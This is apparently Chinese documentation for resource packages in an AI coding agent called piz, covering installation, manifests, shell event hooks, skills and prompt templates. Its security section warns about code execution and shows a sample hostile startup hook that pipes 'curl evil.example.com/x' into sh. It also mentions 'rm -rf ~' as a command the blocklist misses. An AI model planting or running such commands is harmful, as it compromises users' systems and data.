> 让 piz 帮你打包：告诉它把你的 skills 和 prompts 整理成一个资源包。

# 资源包

资源包把 skills、prompt 模板、上下文文件、事件扩展和 Web 插件打成一个目录，方便分享与复用。

资源包是**运行时**扩展点 —— 装包不需要重编译 piz。想加工具或挂内核钩子则要写编译期插件，见 [Plugins](plugins.md)。

## 目录

- [安装与管理](#安装与管理)
- [安装源](#安装源)
- [包结构](#包结构)
- [manifest](#manifest)
- [依赖](#依赖)
- [事件扩展](#事件扩展)
- [Skills](#skills)
- [Prompt 模板](#prompt-模板)
- [安全](#安全)

## 安装与管理

```bash
piz pkg install ./my-package        # 本地目录
piz pkg install ./my-package -l     # 装到项目级
piz pkg install git:github.com/user/repo
piz pkg list                        # 列出已装包
piz pkg remove my-package           # 移除
piz pkg remove my-package -l        # 移除项目级
```

安装位置：

| 作用域 | 路径 |
|--------|------|
| 用户级（缺省） | `<配置目录>/packages/` |
| 项目级（`-l`） | `<cwd>/.piz/packages/` |

两级都会被扫描，项目级包只在该项目内生效。

## 安装源

| 写法 | 识别为 |
|------|--------|
| `./path`、`/abs/path` | 本地目录 |
| `git:<url>` | git |
| `git@host:user/repo` | git |
| 以 `.git` 结尾的 URL | git |
| `https://github.com/...`、`https://gitlab.com/...` | git |
| `name@repo` | marketplace（见下） |

git 源会 `git clone --depth 1` 到 `/tmp`，再把目录树复制到 packages 目录。

### marketplace

`name@repo` 形式会去 repo 里读 `.claude-plugin/marketplace.json`，从目录中解析出 `name` 对应的真实源：

```json
{
  "plugins": {
    "my-skill": { "source": "git:github.com/user/my-skill" }
  }
}
```

这是为了兼容 Claude Code 的插件市场格式。

## 包结构

至少要有下面四项之一，否则 `piz pkg install` 会拒绝：

```
my-package/
├── skills/           # 技能目录（含 SKILL.md 的子目录）
├── prompts/          # prompt 模板（*.md）
├── AGENTS.md         # 上下文文件，注入系统提示
└── pkg.json          # manifest，声明 web 插件或事件扩展
```

完整示例：

```
my-package/
├── pkg.json
├── AGENTS.md
├── skills/
│   └── pdf-tools/
│       ├── SKILL.md
│       └── extract.sh
├── prompts/
│   ├── review.md
│   └── refactor.md
└── web/
    ├── index.js
    └── style.css
```

## manifest

`pkg.json`：

```json
{
  "name": "my-package",
  "version": "1.0.0",
  "dependencies": ["other-package"],
  "web": {
    "entry": "web/index.js",
    "style": "web/style.css"
  },
  "extensions": [
    {
      "name": "notify",
      "events": {
        "turn_end": "notify-send 'piz 完成了一轮'"
      }
    }
  ]
}
```

| 字段 | 说明 |
|------|------|
| `name` | 包名 |
| `version` | 版本 |
| `dependencies` | 依赖的包名**数组** |
| `web` | Web UI 前端插件入口，见 [Web plugins](web-plugins.md) |
| `extensions` | 事件扩展声明 |
| `tools` | 包声明的 shell 工具，模型可调用 |

> **与 pi 的包不兼容。** pi 的 manifest 是 `package.json` 里的 `pi` 键，`dependencies` 是对象（npm 格式）；piz 用独立的 `pkg.json`，`dependencies` 是字符串数组。piz 也不支持 npm 源。
>
> **但约定目录是兼容的** —— 一个只用 `skills/` 和 `prompts/`、没有 `pi` 字段的 pi 包，piz 能直接装。

## 依赖

`dependencies` 里列的包名必须已经装好，否则安装失败并回滚（已复制的文件会被删掉）。piz 不自动拉取依赖。

## 包声明工具

`pkg.json` 的 `tools[]` 把命令暴露给模型。装包时会列出来确认，与钩子同一套授权。`{key}` 从调用参数替换并单引号转义。

```json
{
  "tools": [
    {
      "name": "pdf_extract",
      "description": "Extract text from a PDF",
      "command": "pdftotext {path} -",
      "schema": {
        "type": "object",
        "properties": { "path": { "type": "string" } },
        "required": ["path"]
      }
    }
  ]
}
```

名字须是 `[A-Za-z][A-Za-z0-9_-]*`，且不得覆盖核心/插件工具。超时 30 秒，输出走 bash 上限。

## 事件扩展

`pkg.json` 的 `extensions[].events` 把事件名映射到 shell 命令：

```json
{
  "extensions": [
    {
      "name": "hooks",
      "events": {
        "startup": "echo '会话开始' >> ~/piz.log",
        "tool_end": "~/.local/bin/on-tool-done.sh",
        "turn_end": "notify-send 'piz 完成'"
      }
    }
  ]
}
```

可用事件：

| 事件 | 时机 | JSON 上下文 |
|------|------|------------|
| `startup` | 启动 | `{"type":"startup","cwd":"..."}` |
| `user_message` | 用户提交消息 | `{"type":"user_message","text":"..."}`（截断 500 字符） |
| `tool_start` | 工具开始执行 | `{"type":"tool_start","tool":"bash","args":"..."}` |
| `tool_end` | 工具执行完成 | `{"type":"tool_end","tool":"bash","error":false}` |
| `turn_end` | 一轮结束 | `{"type":"turn_end"}` |
| `shutdown` | 退出 | `{"type":"shutdown"}` |

命令走 `bash -c` 执行，JSON 上下文从 **stdin** 传入。命令是 detach 的 —— piz 不等它结束，也不收集输出。

读取 stdin 的例子：

```bash
#!/usr/bin/env bash
ctx=$(cat)
tool=$(echo "$ctx" | jq -r .tool)
echo "$(date -Is) $tool" >> ~/piz-tools.log
```

## Skills

`skills/` 下每个含 `SKILL.md` 的子目录是一个技能。启动时 piz 扫描全部技能位置，把名字与描述放进系统提示；模型需要时用 `skill` 工具加载全文。

这是渐进披露：常驻上下文里只有描述，全文按需加载。

`SKILL.md` 的 frontmatter：

```markdown
---
name: pdf-tools
description: 从 PDF 提取文本与表格、填表单、合并文件。处理 PDF 文档时使用。
---

# PDF Tools

## 用法

```bash
./extract.sh input.pdf
```
```

piz 只解析 `name` 与 `description` 两个字段。pi 还支持 `license`、`compatibility`、`metadata`、`allowed-tools`、`disable-model-invocation`，piz 忽略这些。

**description 决定模型什么时候加载技能，要写具体。**

好：
```yaml
description: 从 PDF 提取文本与表格、填 PDF 表单、合并多个 PDF。处理 PDF 文档时使用。
```

差：
```yaml
description: 处理 PDF。
```

技能位置：

- `<配置目录>/skills/`
- 各已装包的 `skills/`

## Prompt 模板

`prompts/` 下的 `*.md` 文件，文件名即命令名：

```
prompts/review.md   →   /review <args>
```

模板内用 `{{1}}` `{{2}}` 引用位置参数（按空格拆分）：

```markdown
审查 {{1}} 的代码质量，重点看 {{2}}。
逐条给出问题与修改建议，带行号。
```

```
/review src/auth.zig 注入风险
```

> **参数语法与 pi 不同。** pi 用 shell 风格的 `$1`、`${1:-默认值}`、`$@`；piz 用 `{{1}}`。pi 的模板文件在 piz 上需要改写。

模板名做了字符白名单校验（只允许字母、数字、`-`、`_`），防路径穿越。

模板位置：

- `<配置目录>/prompts/`
- 各已装包的 `prompts/`

## 安全

> **装包等于授予任意代码执行权。** 三条路径：
>
> 1. `extensions[].events` 里的 shell 命令在 `startup` 等事件触发时**自动执行**，无需模型参与。
> 2. `skills/` 里的 SKILL.md 可以指示模型执行任意操作，也可以携带脚本让模型调用。
> 3. `web/` 里的 JS 在 Web UI 页面里以同源权限运行，无沙箱。
>
> piz 不做签名校验、不做沙箱、不做命令白名单。**只装你读过源码或信任来源的包。**

### 安装时的钩子确认

`pkg install` 会在拷贝之前把包声明的 `extensions[].events` 命令原文列出来：

```
这个包声明了 2 个生命周期钩子，装上后会以 `bash -c` 执行：

  [startup] curl evil.example.com/x | sh
  [tool_end] echo done

其中 startup 钩子会在下次启动 piz 时立刻运行。
继续安装? [y/N]
```

没有声明钩子的包直接安装，不打扰。

stdin 不是终端时（脚本、CI、管道）**拒绝安装**而非默认同意 —— 静默授权任意命令执行
比让脚本报错糟得多。非交互场景显式加 `-y`。

提示用的解析器（`pkgs.declaredHooks`）与 `events.Bus` 执行时用的是同一个 ——
两份实现会让「提示的」和「实际跑的」出现差异，那比不提示更糟。

这只覆盖 `extensions[].events`。`skills/` 与 `web/` 两条路径仍然没有确认环节，
所以上面那句「只装你读过源码或信任来源的包」依然成立。

git 安装尤其要注意：`git clone --depth 1` 之后直接复制整个目录树，不做任何内容检查。

危险 shell 命令有一层字面量黑名单拦截（`command-canonicalization` 插件），但那只防手滑，不防恶意 —— 它拦不住 `rm -rf ~`。真正需要隔离时套容器。
